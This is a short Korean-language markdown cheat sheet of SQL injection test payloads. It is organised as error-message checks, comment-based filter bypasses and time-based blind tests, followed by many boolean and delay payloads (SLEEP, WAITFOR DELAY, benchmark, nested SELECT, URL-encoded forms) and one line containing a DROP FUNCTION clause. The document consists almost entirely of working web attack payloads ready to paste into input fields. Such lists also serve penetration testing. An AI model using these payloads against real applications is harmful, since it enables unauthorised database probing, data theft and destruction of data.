# SQLInjection
SqIinjection 테스트 코드 

오류 메시지 점검
```
&apos;
'
```

```
'//AND//'1%'='0 
```

주석으로 우회 
```
'/**/AND/**/'1%'='0
```

시간 기반 테스트 
```
'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z 
```


OR x=y     

HAVING 1=0

AND 1=0


AND 7=9 AND (5=5
 AND 7=9 AND ('5=5
 AND 7=7 AND 'Z'='Y
 AND 7=7 AND ('Z'='Y
 WHERE 1=1 AND 1=0

AND SLEEP(15)
+ SLEEP(10) + '
' AnD SLEEP(15) ANd '1
(SELECT * FROM (SELECT(SLEEP(15)))ecMj)
+benchmark(3200,SHA1(1))+'
ORDER BY SLEEP(15)
'&&SLEEP(15)&&'1
0' AND SLEEP(15)
';WAITFOR DELAY '0:0:30'--
'+WAITFOR+DELAY+'0:0:10'--+-"

(select * from (select(sleep(10)))a)
%2c(select%20*%20from%20(select(sleep(10)))a)
'+(select*from(select(sleep(7*7)))a)+'
 OR 3=3 AND ('W' LIKE 'Y
AND (SELECT * FROM (SELECT(SLEEP(15)))bAKL) AND 'vRxe'='vRxe
IF(7=4) SELECT 7 ELSE DROP FUNCTION xcjl--
%' AND 1=8 AND '%'='
